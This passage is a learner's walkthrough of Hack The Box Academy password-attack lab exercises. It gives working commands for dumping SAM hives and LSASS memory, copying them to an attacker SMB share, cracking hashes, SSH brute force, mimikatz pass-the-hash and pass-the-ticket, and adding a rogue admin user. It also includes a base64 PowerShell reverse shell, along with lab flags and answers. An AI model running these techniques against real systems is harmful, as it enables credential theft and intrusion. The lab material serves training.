02/07/2022  11:46 AM    <DIR>          Users
02/07/2022  11:58 AM    <DIR>          Windows
               3 File(s)     12,906,496 bytes
               5 Dir(s)  12,022,145,024 bytes free

C:\Windows\system32>
```
So this way we copy registry hives which are useful and contain hashes for local acc pswds, contain bootkey, creds for domain acc.

Registry Hive 	Description
hklm\sam 	- Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
hklm\system - Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
hklm\security - Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

Then on the attacking machine (Our VM or Pwnbox) we need to run this command replacing htb-ac-1052766 to the our username accordingly. I am doing this task on the pwnbox so this is mine command:
```c
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1052766/Documents/
```

So now we need to start moving our hive copies to attack machine. Run the following commands one-by-one and change the IP to the IP of the attacking machine:
```c
C:\>move sam.save \\10.10.15.129\CompData
        1 file(s) moved.

C:\>move system.save \\10.10.15.129\CompData
        1 file(s) moved.

C:\>move security.save \\10.10.15.129\CompData
        1 file(s) moved.
```

It will give us the output, something like this:
```c

Then go to /Documents directory and you will see the copies of sam, security and system .save files
So we see 3 file then we need to run this command which will dump the hashes offline - Impacket's `secretsdump.py`
```c
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

We will create a file in /Documents directory in our attack box which will contain NT hashes for admin and other users except Guest, DefaultAccount and WDAGUtilityAccount
```c
nano hashestocrack.txt

We will crack them with hashcat:
``` c

```


9. Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.
While we still have rdp connection with target we run on our attacking machine this:
```c

### Attacking LSASS

10. What is the name of the executable file associated with the Local Security Authority Process?

Ctr+F the page to find the answer 
`lsass.exe`

11. Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)

So this task took quite a loooong time for me to do, because I was initially doing it on my Kali machine in Vmware, but that was not successful, the lsass.dmp simply wasn't creating no mater how many times I tried. Then I've decided to use the built-in Pwnbox and that went smooth as fuck!

The process of getting the hash was interesting to me. Here are the steps:

First of all, we are provided with the `htb-student` and `HTB_@cademy_stdnt!` username and password to RDP to our Windows victim machine, so simply use rdesktop (I lowkey like it more that xfreerdp)
```c
rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' 10.129.214.228 
```

Once logged in, navigate to Users directory inside the C: drive and enable permissions to get access to this directory and be able to obtain the hash later
Then open the powershell as admin and find the Process ID (PID) of the lsass:
```c
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    656   0 lsass
```

In my case the PID of the lsass is 656 which I will use in the next command. The following command is used to create a memory dump of the LSASS (Local Security Authority Subsystem Service) process in Windows:
```c
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\Uses\Vendor\AppData\Local\Temp\lsass.dmp full
```

When we run this command, then we can navigate to `C:\Uses\Vendor\AppData\Local\Temp\` directory and list the files and we will see our dumped lsass file, waiting for us to be moved to our attack machine ;)

Now on out attack machine, we use the following command to set up a simple SMB (Server Message Block) server using the Impacket library in Python, to get the hash
```c
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1052766/Documents/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

- **`sudo`**:
    - This command is used to run the following command with elevated privileges (as a superuser). This is often necessary for network operations or accessing certain files and directories.
- **`python3`**:
    - This indicates that you are running a Python 3 script. Impacket is a collection of Python classes for working with network protocols, particularly those used in Windows environments.
- **`/usr/share/doc/python3-impacket/examples/smbserver.py`**:
    - This is the path to the SMB server script included with the Impacket library. This script allows you to create an SMB server to share files over the SMB protocol.
- **`-smb2support`**:
    - This flag enables support for the SMB2 protocol. SMB2 is a more efficient and feature-rich version of the SMB protocol compared to its predecessor, SMB1. Enabling this support allows clients using SMB2 to connect and interact with your SMB server.
- **`CompData`**:
    - This is the name of the share that will be created by the SMB server. When clients connect to your SMB server, they will see this share listed as **`CompData`**. It serves as a point of access for shared files or directories.
- **`/home/htb-ac-1052766/Documents/`**:
    - This specifies the local directory that will be shared via the SMB server. In this case, the contents of the **`/home/htb-ac-1052766/Documents/`** directory will be accessible to clients connecting to the SMB share named **`CompData`**. Change the htb-ac-1052766 to the name of your user

In a nutshell we need to use this command to make file-transfer of `lsass.dmp` file from Windows victim machine to our attacking machine 

Then on the Windows victim machine in powershell we can now move the lsass.dmp file to our attack machine:
```c
C:\>move lsass.dmp \\<Attack-Machine-IP>\CompData
        1 file(s) moved.
```

As we now have the file lsass.dmp on our attack machine, we can use pypykatz command to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file. The output of the long-ass command :
```c
pypykatz lsa minidump /home/htb-ac-1052766/Documents/lsass.dmp

```

Actually I inserted only the part of the command where we see the NT hash only for the requested user Vendor. But the command dumped all hashes of all active users

As we see the hash is `31f87811133bc6aaa75a536e77f64314`
So to get answer we need to crack it using hashcat:
```c
sudo hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt

### Attacking Active Directory & NTDS.dit

12. What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***) 

Read the page or Ctr+f: NTDS.dit


13.  Submit the NT hash associated with the Administrator user from the example output in the section reading. 

Just look at the last image in the page: 64f12cddaa88057e06a81b54e73b949b


15. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive) 

I took a hint as my username-anarchy was not working. So in the hint they say to use fasttrack password wordlist and firstinitiallastname pattern:
```c

```

Took sometime but I found password:
```
jmarston:P@ssword!
```

16. Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive) 

I decided to use simple method:
```c

### Credential Hunting in Windows

17.  RDP to 10.129.202.99 (ACADEMY-PWATTACKS-WIN10CHUNTING) with user "Bob" and password "HTB_@cademy_stdnt!"
What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive) 

First we need to rdp to target:
```c
xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt!
```

Then we need to explore the folders of the User Bob for that. Easy


18. What is the GitLab access code Bob uses? (Format: Case-Sensitive) 

Same here, just look for folders

19.  What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive) 

For this FUCKED UP TASK, solving which I spent 1.5 hours, because FUCKING INTERNET is not working there on windows. I tried to transfer https://github.com/AlessandroZ/LaZagne tool to Windows using, scp, samba, but all of that was not successful. Eventually I set up python server on my kali in the directory where I already downloaded this LaZagne zip file: 
```c
python3 -m http.server 8080
```

Then on windows machine, go to browser
```c
http://KaliIP:8000
```

And you will see all the files located in the directory where you ran your python server

Okay we can unzip the file, BUT GUESS FUCKING WHAT? We also need to transfer python Windows installer to target as well!
So do the same with it as for LaZagne. Then when you have that python installed, you need to add it to the PATH:
Here was my case:
```c
[System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Users\bob\AppData\Local\Programs\Python\Python313;C:\Users\bob\AppData\Local\Programs\Python\Python313\Scripts\", "Bob")
```

Then close and open powershell, navigate to directory where your LaZagne is located, to the windows folder inside it, and run python script:
```c
.\laZagne.py all
```

This will give you this:
```c

So the answer easy to find from this.


20. What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive) 

Here is pretty easy, just look for some folders, open some scripts: Inlanefreightisgreat2022


21. What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive) 

Here as well, just open file for that Automation&Script folder: edgeadmin:Edge@dmin123!


### Credential Hunting in Linux

22. Examine the target and find out the password of the user Will. Then, submit the password as the answer.

In the hint it is written that there is user `Kira` with password `LoveYou1`, which can be useful for ssh. However it did not work like that. Our task is to create a mutated password list using her password. First add her password to file:
```c
nano kirapassloveyou1.txt 

LoveYou1
```

Then make a list of mutated passwords with hashcat:
```c
hashcat --force kirapassloveyou1.txt -r custom.rule --stdout | sort -u > mutatedkirapassloveyou1.list

┌──(r3so1v3㉿kali)-[~/Hacking/academy/password-attacks]
└─$ wc -l mutatedkirapassloveyou1.list                                 
459 mutatedkirapassloveyou1.list
```

So we have 459 passwords there. Let's brute force ssh service:
```c
hydra -l kira -P mutatedkirapassloveyou1.list -u 10.129.87.169 ssh                 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-15 21:19:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 459 login tries (l:1/p:459), ~29 tries per task
[DATA] attacking ssh://10.129.87.169:22/
[22][ssh] host: 10.129.87.169   login: kira   password: L0vey0u1!
1 of 1 target successfully completed, 1 valid password found
```

Now we got her ssh password `L0vey0u1!` We can use it to ssh to target:
```c
ssh kira@10.129.87.169
```

After that we can use history command to figure our one tool that is needed to get Will's password:
```c
kira@nix01:~$ cat .bash 
.bash_history  .bash_logout   .bashrc        
kira@nix01:~$ cat .bash_history 
cd
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt/
ls
./firefox_decrypt.py 
su
./firefox_decrypt.py 
python3.9 firefox_decrypt.py 
cd ..
rm -rf firefox_decrypt/
vim .bash_history 
su
firefox 
su
firefox 
cd .mozilla/firefox/
ls
cd ytb95ytb.default-release/
ls
cat logins.json 
vim logins.json 
jq
su
ls
vim logins.json 
su
cd
cd .ssh/
ls
rm *
ssh-keygen -t rsa -m PEM
cat id_rsa.pub > authorized_keys
vim authorized_keys 
su
```

As we see this tool is called `firefox_decrypt`. Thus we need to firstly download it to our attack machine as it was deleted in the target one.
```c
git clone https://github.com/unode/firefox_decrypt.git

    inet 10.10.16.31/23 scope global tun0
```

After that you see that I displayed ip of my kali's vpn, so we need it to transfer this tool to victim via python server. On our attacking machine:
```c
python3 -m http.server 8080
```

On the victim machine after running previous command:
```c
kira@nix01:~$ wget http://10.10.16.31:8080 -r firefox_decrypt
```

After hitting enter the transfer process will begin, and we will need to wait for some time.
Once it is transferred we can use this tool to obtain the information about Will's creds:
```c
kira@nix01:~$ ls

```


### Passwd, Shadow & Opasswd

23.  Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer. 

As we have Will's creds, we can ssh to the target at first:
```c
ssh will@ip
```

Then we can search for some files:
```c
will@nix01:~$ ls -la
total 36
drwxr-xr-x 5 will will 4096 Oct 15 17:15 .
drwxr-xr-x 5 root root 4096 Feb  9  2022 ..
drwxrwxr-x 2 will will 4096 Feb  9  2022 .backups
-rw------- 1 will will   81 Feb  9  2022 .bash_history
-rw-r--r-- 1 will will  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 will will 3771 Feb 25  2020 .bashrc
drwx------ 2 will will 4096 Oct 15 17:15 .cache
drwx------ 3 will will 4096 Oct 15 17:15 .config
-rw-r--r-- 1 will will  807 Feb 25  2020 .profile
will@nix01:~$ cd .backups/
will@nix01:~/.backups$ ls
passwd.bak  shadow.bak
```

As we can see, there are 2 files that are interesting to us, passwd.bak and shadow.bak. We can open them and see what's inside, but we only need to get the root password, so we need to go to shadow.bak file and select the first line belonging to root: 
```c
root:$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg
```

We can copy and paste this line to our attack machine and name it hash.txt. Then we need to use password.list and custom.rule files from resources in the top right section in htb-academy password attacks module. Now we need to create a mutated list of that passwords using the custom.rule:
```c
hashcat --force password.list -r custom.rule --stdout | sort -u > mutated-passwords
```

For now we have mutated-passwords file which we can finally use to crack the hash of the root password:
```c
john hash.txt --wordlist=mutated-passwords 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead

```


### Pass the Hash (PtH)

`Note: The tools we will be using are located in the C:\tools directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01). `

24.  Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.

There are many tools that can be used to perform PtH, but I decided to use impacket tool:
```c
┌──(r3so1v3㉿kali)-[~/Hacking/academy/password-attacks/pth]

```

25.  Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.

First we need to Enable Restricted Admin Mode to Allow PtH
```c
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

After that we can connect to our target via xfreerdp or rdesktop

27.  Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?

As we have already connected to windows target machine we can use mimikatz tool with sekurlsa::logonpasswords flag to get the hashes of all users
```c
C:\tools>mimikatz.exe privilege::debug sekurlsa::logonpasswords "sekurlsa::pth /user:administrator /rc4:30B3783CE2ABF1AF70F77D0660CF3453 /domain:inlanefreight.htb /run:cmd.exe" exit

28. Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.

As we have the David's hash we can now use mimikatz again to pth and read the file david.txt
```c
C:\tools>mimikatz.exe privilege::debug sekurlsa::logonpasswords "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb /run:cmd.exe" exit

So on
```

Then when we hit enter, another cmd window will open, where we can display the content of the file we need:

```

Then the new window pops up again:
```c
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>dir \\dc01\julio
 Volume in drive \\dc01\julio has no label.

C:\Windows\system32>type \\dc01\julio\julio.txt
JuL1()_SH@re_fl@g
```

30. Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.

So for that we need to open powershell again as administrator and run these commands, changing the hash to julio's one `64f12cddaa88057e06a81b54e73b949b`:
```c
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
```

After that we need to open another powershell windows and run netcat listener on port 8001:
```c
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

After that we need to get the reverse shell. For that ,we can visit [https://www.revshells.com/](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)` After we get the payload we go back to powershell windows, not where the netcat is running, but where we ran Invoker-SMBExec for new user using julio and his hash, and paste the payload like this:

```c
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

Once we run that command we get the reverse shell and now can read the content of the flag in C:\julio directory
```c
powershell-session

PS C:\Windows\system32> type C:\julio\flag.txt

```


#### Pass The Ticker (PtT) from Windows

31. Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

First we need to use xfreerdp to get RDP session with target:
```c
xfreerdp /v:10.129.204.23 /u:administrator                      
[14:05:47:573] [3361:3362] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0

```

Then open the cmd and insert the following commands one by one:
```c
C:\tools>mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```

Then count the number of users. (3)

32.  Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john 

First of all we need to rdp to out target with the password `AnotherC0mpl3xP4$$`:
```c
rdesktop -u Administrator 10.129.204.23
```

Then we need to open cmd and go to tools directory to use mimikatz to get the existing tickets:
```c
 C:\tools>
mimikatz.exe  
privilege::debug  
sekurlsa::tickets 
exit
```

After that I exited mimikatz to list all the saved file of tickets of users:
```c

               3 Dir(s)  17,985,867,776 bytes free
```

So we can see that ticket of john is in the file named: `[0;4642f]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi` inside the tools directory
After that I want to import john's ticket in new cmd session:
```c
C:\tools>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08

  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\tools\[0;4642f]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\tools\[0;4642f]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7558143B8
```

Then after entering the last command we are getting new cmd windows where we can find and read the content of the file `john.txt`
```c
C:\tools>dir \\DC01.inlanefreight.htb\john
 Volume in drive \\DC01.inlanefreight.htb\john has no label.
 Volume Serial Number is B8B3-0D72

```


33.  Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

In the same cmd session where we get the previous flag, we can run powershell commands for lateral movement , and get the flag:
```c
powershell  
Enter-PSSession -ComputerName DC01  
whoami  
hostname  
[DC01]: PS C:\john> ls


    Directory: C:\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/18/2022   8:20 AM             19 john.txt


[DC01]: PS C:\john> cat .\john.txt
P4$$_th3_Tick3T_PSR
```


#### Pass the Ticket (PtT) from Linux

SSH to with user "david@inlanefreight.htb" and password "Password2"

34. Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.

```c
ssh david@inlanefreight.htb@10.129.204.23 -p 2222

cat flag.txt
```


35. Which group can connect to LINUX01?

For this we can use the tool that was mentioned in the module, `realm`:
```c
david@inlanefreight.htb@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```


36. Look for a keytab file that you have read and write access. Submit the file name as a response.

```c
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py

```


37. Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.

```c
david@inlanefreight.htb@linux01:~$ klist
Ticket cache: FILE:/tmp/krb5cc_647401107_OiQT5o

	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

As we got the ntlm hash we can now crack it via crackstation and get the password: `Password5`
```c
carlos@inlanefreight.htb@linux01:~$ ls
flag.txt  script-test-results.txt
carlos@inlanefreight.htb@linux01:~$ cat flag.txt 
C@rl0s_1$_H3r3
```

38. Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.

For that we can do the following. We can log in as user carlos with the password that we got from cracking the ntlm hash
```c
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
Password: 
carlos@inlanefreight.htb@linux01:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for

# 
# Notice that tasks will be started based on the cron's system

carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

I tried to use smbclient to get the .txt file but could not manage to do that. So I searched for files that can have keytab hashes:
```c
carlos@inlanefreight.htb@linux01:~$ ls -la
total 56
drwx---r-x 5 carlos@inlanefreight.htb domain users@inlanefreight.htb  4096 Oct 12  2022 .

-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Oct 21 13:35 svc_workstations.kt
```

So there is a file `svc_workstations._all.kt` which we will use for extracting keytab hashes with KeyTabExtract:
```c
carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.

	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
	AES-128 HASH : 3a7e52143531408f39101187acc80677

```

We got the ntlm hash again `7247e8d4387e76996ff3f18a34316fdd` which we can crack via crackstation and eventually get the `Password4` as a password for svc_workstations user. The remaining steps are to ssh as svc with its password and read the content of the file flag.txt in the home directory
```c
carlos@inlanefreight.htb@linux01:~/.scripts$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222

39. Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.

Simply use `sudo -l ` when you want to list the privileges of the user
```c
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb:

```


40. Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.

Once we are logged in as root we need to try the next commands to find the file ccache file for julio user to use it for connection to smbshares and getting flag:
```c

41. Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).

For that we can use tool called `lilikatz.sh` it is a shell script tool used to automate the process of installing and running **Mimikatz** in Linux-based environments, particularly for penetration testing and post-exploitation tasks in **Active Directory** environments. So basically we need to use it to extract kerberos tickets and finding the location of them in the system as well
First I downloaded it from github to my attack machine, then started python server to transfer it to our target:
```c
┌─[us-academy-5]─[10.10.14.124]─[htb-ac-1052766@htb-gcc9lyrxtl]─[~/linikatz]
└──╼ [★]$ git clone https://github.com/CiscoCXSecurity/linikatz.git
┌─[us-academy-5]─[10.10.14.124]─[htb-ac-1052766@htb-gcc9lyrxtl]─[~/linikatz]
└──╼ [★]$ cd linikatz
┌─[us-academy-5]─[10.10.14.124]─[htb-ac-1052766@htb-gcc9lyrxtl]─[~/linikatz]
└──╼ [★]$ python3 -m http.server 5252
Serving HTTP on 0.0.0.0 port 5252 (http://0.0.0.0:5252/) ...
10.129.204.23 - - [21/Oct/2024 09:56:41] "GET /linikatz.sh HTTP/1.1" 200 -

```

Then on the target machine we transfer the script via curl command and use it to find the location of the keytab file
```c
root@linux01:~# curl http://10.10.14.124:5252/linikatz.sh -o linikatz.io

#### Protected files

42.  Use the cracked password of the user Kira and log in to the host and crack the "id_rsa" SSH key. Then, submit the password for the SSH key as the answer. 

As far as you remember, we already confronted with user Kira and found her password `LoveYou1` which is not working with ssh connection. So we can modify that password and make mutated list of it. First we will create file kirapass and simply insert the above password there:
```c
┌[parrot]─[23:30-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]
└╼r3so1ve$nano kirapass       

LoveYou1
```

Then we need to apply custom.rule for it to mutate. The custom rule and 2 another files of usernames and passwords, can be downloaded by clicking resources button on the top of the page of the password attacks modules. Then we need to use hydra with already made mutated passwords to bruteforce ssh service
```c
┌[parrot]─[23:31-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]
└╼r3so1ve$hashcat --force kirapass -r custom.rule --stdout | sort -u > kira-mutated-passwords 
┌[parrot]─[23:32-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]
└╼r3so1ve$hydra -l kira -P kira-mutated-passwords -u 10.129.29.149 ssh

```

So we got new password: `L0vey0u1!` which we can use to ssh:
```c
┌[parrot]─[23:32-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks]

kira@nix01:~$ 
```

Then we need to search for id_rsa, and it looks like it is encrypted:
```c

```
- **`grep`**: This is the command being used to search for patterns in files.
- **`-r`**: This option tells `grep` to search recursively through directories and their subdirectories.  
- **`-n`**: This option tells `grep` to show the line numbers of matching lines in the output.
- **`-w`**: This option ensures that `grep` matches whole words only, meaning it will not match substrings within longer words.
- **`"PRIVATE KEY"`**: This is the pattern `grep` is searching for. In this case, it's looking for the exact phrase "PRIVATE KEY".
- **`/*`**: This specifies the starting point for the search. The `/*` means that `grep` will search through all files and directories in the root directory (`/`).
- **`2>/dev/null`**: This part redirects error messages (file descriptor 2) to `/dev/null`, effectively suppressing them. This is useful when you want to avoid cluttering the output with errors, such as "Permission denied" messages that can occur when trying to read certain directories or files.
- **`|`**: This is a pipe, which takes the output of the command on the left and uses it as input for the command on the right.
- **`grep ":1"`**: This second `grep` filters the output from the first `grep` command, looking for lines that contain ":1". This indicates that it is looking for matches that occur on the first line of files.

In summary, the command is searching through all files starting from the root directory for the phrase "PRIVATE KEY" and displays only those occurrences that are found on the first line of the matching files.

Then I cat the content of the file id_rsa
```c
kira@nix01:~$ cd .ssh
kira@nix01:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
kira@nix01:~/.ssh$ cat id_rsa

After that I simply copied this id_rsa to my attack machine and applied script to extract the hash of the password from the provided id_rsa file and then writes output to ssh.hash
```c
┌[parrot]─[23:48-21/10]─[/home/r3so1ve/hack/htb-academy/password-attacks/kira]
└╼r3so1ve$nano id_rsa

└╼r3so1ve$python3 /usr/share/john/ssh2john.py id_rsa > ssh.hash

```

Finally we use john to crack the ssh.hash
```c
